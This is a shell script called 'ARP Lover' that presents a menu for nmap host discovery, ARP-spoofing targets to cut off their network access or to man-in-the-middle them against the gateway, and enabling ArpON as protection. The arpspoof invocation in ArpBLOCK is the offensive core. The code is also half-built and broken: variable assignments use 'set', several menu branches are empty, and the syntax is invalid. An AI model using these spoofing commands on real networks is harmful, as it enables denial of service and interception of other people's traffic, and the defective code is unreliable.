#!/bin/sh

##########################
#
#
#
#
#
#
#
#########################

IPs=()

# ARP Scan (Discovery) 
function Scan() {
set Targets=$(sudo nmap -sn $1 2>/dev/null -oG - | grep "Up$" | awk '{printf "%s ", $2}')
set Gateway=$(ip route show default dev $2 | awk '{printf $3}' )
}

# Arp Spoof  (Application) 
function ArpBLOCK() { 
	for i in $Targets
	do
		printf "Spoofing " $i "..."
		xterm -hold -e "sudo arpspoof -t $1 -i $2 -c own ${Gateway}"
		x+=$!
	
	done
}

function ArpSniff() {
	printf ""
}

# Correction (ReArping)

printf "\e[37;41m╔═══════════════════════════════════════════════════════════════════════════╗ \033[0m\n"
printf "\e[37;41m║                                                                           ║ \033[0m\n"
printf "\e[37;41m║    █████╗ ██████╗ ██████╗     ██╗      ██████╗ ██╗   ██╗███████╗██████╗   ║ \033[0m\n"
printf "\e[37;41m║   ██╔══██╗██╔══██╗██╔══██╗    ██║     ██╔═══██╗██║   ██║██╔════╝██╔══██╗  ║ \033[0m\n"
printf "\e[37;41m║   ███████║██████╔╝██████╔╝    ██║     ██║   ██║██║   ██║█████╗  ██████╔╝  ║ \033[0m\n"
printf "\e[37;41m║   ██╔══██║██╔══██╗██╔═══╝     ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗  ║ \033[0m\n"
printf "\e[37;41m║   ██║  ██║██║  ██║██║         ███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║  ║ \033[0m\n"
printf "\e[37;41m║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝  ║ \033[0m\n"
printf "\e[37;41m║                                                                           ║ \033[0m\n"
printf "\e[37;41m╠═════════════════════════ BERCHIL Idriss ══════════════════════════════════╝ \033[0m\n"
printf "║\n"
printf "╠═  1. Scan for IP Addresses (ARP Scan)\n"
printf "╠═  2. Kill Network Access (ARP Spoof target only)\n"
printf "╠═  3. Man In the Middle (ARP Spoof target & gateway)\n"
printf "╠═  4. Protect yourself using ArpON\n"
printf "╚═  5. Exit\n"



while true 
do
	printf "\n\n> "
	read -e choice
	case ${choice} in
	1)

	;;
	2)

	;;
	3)

	;;
	4)
		printf "Running Arpon ...\n"
		sudo arpon -D -d -i $2
		printf "Arpon has been enabled as background daemon.\n"
		;;
	5)
		if [[ ! ${#IPs[@]} -eq 0 ]] then
			printf "Rearping...\n"
		fi

		for i in $IPs 
		do
			kill -SIGINT $i
			sleep 5
			sudo kill -SIGKILL $i
		done

		printf "Exiting ...\n"	
		exit 0
		;;
		
	esac
done



